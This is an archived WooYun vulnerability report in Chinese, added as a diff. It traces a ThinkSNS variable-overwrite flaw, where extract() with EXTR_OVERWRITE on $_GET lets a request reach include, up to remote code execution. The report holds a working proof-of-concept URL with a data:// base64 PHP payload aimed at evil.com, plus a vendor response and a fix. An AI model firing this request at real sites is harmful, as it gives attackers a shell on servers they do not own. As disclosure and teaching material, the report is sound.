@@ -1,0 +1,334 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ThinkSNS getshell一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ThinkSNS getshell一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-11-24 23:21</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-27：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-14：	细节向普通白帽子公开<br/>
+									2014-01-03：	细节向实习白帽子公开<br/>
+									2014-02-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ThinkSNS某处处理不当导致get shell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">\apps\public\Lib\Action\CommentAction.class.php reply函数<br />
+<br />
+</p><pre><code>public function reply() {<br />
+          $var = $_GET;<br />
+<br />
+          $var[&#039;initNums&#039;] = model(&#039;Xdata&#039;)-&gt;getConfig(&#039;weibo_nums&#039;, &#039;feed&#039;);<br />
+          $var[&#039;commentInfo&#039;] = model(&#039;Comment&#039;)-&gt;getCommentInfo($var[&#039;comment_id&#039;], false);<br />
+          $var[&#039;canrepost&#039;]  = $var[&#039;commentInfo&#039;][&#039;table&#039;] == &#039;feed&#039;  ? 1 : 0;<br />
+          $var[&#039;cancomment&#039;] = 1;<br />
+          // 获取原作者信息<br />
+          $rowData = model(&#039;Feed&#039;)-&gt;get(intval($var[&#039;commentInfo&#039;][&#039;row_id&#039;]));<br />
+          $appRowData = model(&#039;Feed&#039;)-&gt;get($rowData[&#039;app_row_id&#039;]);<br />
+          $var[&#039;user_info&#039;] = $appRowData[&#039;user_info&#039;];<br />
+          // 微博类型<br />
+          $var[&#039;feedtype&#039;] = $rowData[&#039;type&#039;];<br />
+          // $var[&#039;cancomment_old&#039;] = ($var[&#039;commentInfo&#039;][&#039;uid&#039;] != $var[&#039;commentInfo&#039;][&#039;app_uid&#039;] &amp;&amp; $var[&#039;commentInfo&#039;][&#039;app_uid&#039;] != $this-&gt;uid) ? 1 : 0;<br />
+          $var[&#039;initHtml&#039;] = L(&#039;PUBLIC_STREAM_REPLY&#039;).&#039;@&#039;.$var[&#039;commentInfo&#039;][&#039;user_info&#039;][&#039;uname&#039;].&#039; ：&#039;;          // 回复<br />
+<br />
+          $this-&gt;assign($var);<br />
+          $this-&gt;display();<br />
+     }</code></pre><p class='detail'><br />
+<br />
+不管中间过程，$var被赋值被$_GET，并在最后进入了assign函数<br />
+<br />
+\core\OpenSociax\Action.class.php assign<br />
+<br />
+</p><pre><code>public function assign($name,$value=&#039;&#039;) {<br />
+        if(is_array($name)) {<br />
+            $this-&gt;tVar   =  array_merge($this-&gt;tVar,$name);<br />
+        }elseif(is_object($name)){<br />
+            foreach($name as $key =&gt;$val)<br />
+                $this-&gt;tVar[$key] = $val;<br />
+        }else {<br />
+            $this-&gt;tVar[$name] = $value;<br />
+        }<br />
+    }</code></pre><p class='detail'><br />
+<br />
+assign其实就是给模板变量赋值，也就是说我们的$_GET最后进入了模板变量中。<br />
+<br />
+然后回到一开始的reply函数，可以看到在最后调用了display：<br />
+<br />
+\core\OpenSociax\functions.inc.php display函数<br />
+<br />
+</p><pre><code>// 输出模版<br />
+function display($templateFile=&#039;&#039;,$tvar=array(),$charset=&#039;UTF8&#039;,$contentType=&#039;text/html&#039;) {<br />
+    fetch($templateFile,$tvar,$charset,$contentType,true);<br />
+}</code></pre><p class='detail'><br />
+<br />
+fetch找到相应的模板并和我们提交的变量结合编译之：<br />
+<br />
+\core\OpenSociax\Action.class.php fetch函数<br />
+<br />
+</p><pre><code>protected function fetch($templateFile=&#039;&#039;,$charset=&#039;utf-8&#039;,$contentType=&#039;text/html&#039;,$display=false) {<br />
+        $this-&gt;assign(&#039;appCssList&#039;,$this-&gt;appCssList);<br />
+        $this-&gt;assign(&#039;langJsList&#039;, $this-&gt;langJsList);<br />
+        Addons::hook(&#039;core_display_tpl&#039;, array(&#039;tpl&#039;=&gt;$templateFile,&#039;vars&#039;=&gt;$this-&gt;tVar,&#039;charset&#039;=&gt;$charset,&#039;contentType&#039;=&gt;$contentType,&#039;display&#039;=&gt;$display));<br />
+        return fetch($templateFile, $this-&gt;tVar, $charset, $contentType, $display);<br />
+    }</code></pre><p class='detail'><br />
+<br />
+把请求转发给真正的fetch函数：<br />
+<br />
+\core\OpenSociax\functions.inc.php<br />
+<br />
+</p><pre><code>function fetch($templateFile=&#039;&#039;,$tvar=array(),$charset=&#039;utf-8&#039;,$contentType=&#039;text/html&#039;,$display=false) {<br />
+    //注入全局变量ts<br />
+    global  $ts;<br />
+    $tvar[&#039;ts&#039;] = $ts;<br />
+    //$GLOBALS[&#039;_viewStartTime&#039;] = microtime(TRUE);<br />
+<br />
+    if(null===$templateFile)<br />
+        // 使用null参数作为模版名直接返回不做任何输出<br />
+        return ;<br />
+<br />
+    if(empty($charset))  $charset = C(&#039;DEFAULT_CHARSET&#039;);<br />
+<br />
+    // 网页字符编码<br />
+    header(&quot;Content-Type:&quot;.$contentType.&quot;; charset=&quot;.$charset);<br />
+<br />
+    header(&quot;Cache-control: private&quot;);  //支持页面回跳<br />
+<br />
+    //页面缓存<br />
+    ob_start();<br />
+    ob_implicit_flush(0);<br />
+<br />
+    // 模版名为空.<br />
+    if(&#039;&#039;==$templateFile){<br />
+        $templateFile   =   APP_TPL_PATH.&#039;/&#039;.MODULE_NAME.&#039;/&#039;.ACTION_NAME.&#039;.html&#039;;<br />
+<br />
+    // 模版名为ACTION_NAME<br />
+    }elseif(file_exists(APP_TPL_PATH.&#039;/&#039;.MODULE_NAME.&#039;/&#039;.$templateFile.&#039;.html&#039;)) {<br />
+        $templateFile   =   APP_TPL_PATH.&#039;/&#039;.MODULE_NAME.&#039;/&#039;.$templateFile.&#039;.html&#039;;<br />
+<br />
+    // 模版是绝对路径<br />
+    }elseif(file_exists($templateFile)){<br />
+<br />
+    // 模版不存在<br />
+    }else{<br />
+        throw_exception(L(&#039;_TEMPLATE_NOT_EXIST_&#039;).&#039;[&#039;.$templateFile.&#039;]&#039;);<br />
+    }<br />
+<br />
+    //模版缓存文件<br />
+    $templateCacheFile  =   C(&#039;TMPL_CACHE_PATH&#039;).&#039;/&#039;.APP_NAME.&#039;_&#039;.tsmd5($templateFile).&#039;.php&#039;;<br />
+<br />
+    //载入模版缓存<br />
+    if(!$ts[&#039;_debug&#039;] &amp;&amp; file_exists($templateCacheFile)) {<br />
+    //if(1==2){ //TODO  开发<br />
+        extract($tvar, EXTR_OVERWRITE); //exploit!<br />
+        //var_dump($_SESSION);<br />
+        //载入模版缓存文件<br />
+        include $templateCacheFile; //getshell here!<br />
+<br />
+    //重新编译<br />
+    }else{<br />
+<br />
+        tshook(&#039;tpl_compile&#039;,array(&#039;templateFile&#039;,$templateFile));<br />
+<br />
+        // 缓存无效 重新编译<br />
+        tsload(CORE_LIB_PATH.&#039;/Template.class.php&#039;);<br />
+        tsload(CORE_LIB_PATH.&#039;/TagLib.class.php&#039;);<br />
+        tsload(CORE_LIB_PATH.&#039;/TagLib/TagLibCx.class.php&#039;);<br />
+<br />
+        $tpl    =   Template::getInstance();<br />
+        // 编译并加载模板文件<br />
+        $tpl-&gt;load($templateFile,$tvar,$charset);//getshell here!<br />
+    }<br />
+    ... ...<br />
+}</code></pre><p class='detail'><br />
+<br />
+分析下这个函数的逻辑：<br />
+<br />
+首先判断模板文件是否存在，不存在则尝试加载默认模板文件，如果加载失败就异常退出<br />
+<br />
+其次如果模板文件存在，那么该文件是否缓存过，如果缓存过，那么直接include缓存文件，在include前使用extract对模板变量赋值<br />
+<br />
+如果模板没有缓存，是第一次被调用，那么就编译模板文件并加载它<br />
+<br />
+在使用缓存的时候程序用extract对变量进行赋值，可以看到第二个参数，EXTR_OVERWIRTE，表示如果某变量已经存在，那么就覆盖这个变量。<br />
+<br />
+下面看看非缓存情况下的处理：<br />
+<br />
+\core\OpenSociax\Template.class.php load函数<br />
+<br />
+</p><pre><code>// 加载模板<br />
+    public function load($templateFile,$templateVar,$charset) {<br />
+        $this-&gt;tVar = $templateVar;<br />
+        $templateCacheFile  =  $this-&gt;loadTemplate($templateFile);<br />
+        // 模板阵列变量分解成为独立变量<br />
+        extract($templateVar, EXTR_OVERWRITE);<br />
+        //载入模版缓存文件<br />
+        include $templateCacheFile;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+与缓存情况下相同，也是调用extract来覆盖变量，由于第二个参数的使用，因此如果模板变量可控的话，我们可以覆盖任意变量。<br />
+<br />
+可以覆盖$templateCacheFile变量，这样变量覆盖就变成了任意文件包含，并可getshell. </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">上传一个jpg，然后include之：<br />
+<br />
+</p><p class="detail"><a href="../images/242140461ed8c5ee747e58e23f01f89ecc444651.jpg" target="_blank"><img src="../images/242140461ed8c5ee747e58e23f01f89ecc444651.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+在allow_url_include为on下可以这样getshell：<br />
+<br />
+</p><pre><code>http://www.evil.com/thinksns/index.php?app=public&amp;mod=Comment&amp;act=reply&amp;templateCacheFile=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/2421363402af361e446f17b219eb8e014c9758c8.jpg" target="_blank"><img src="../images/2421363402af361e446f17b219eb8e014c9758c8.jpg" alt="getshell.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">方法有多种，结合业务需要来做：<br />
+<br />
+</p><pre><code>extract($tvar, EXTR_OVERWRITE);<br />
+<br />
+//载入模版缓存文件<br />
+include $templateCacheFile.&#039;.php&#039;;</code></pre><p class='detail'> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043945" title="ThinkSNS getshell一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-11-24 23:29</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢反馈！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43945";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
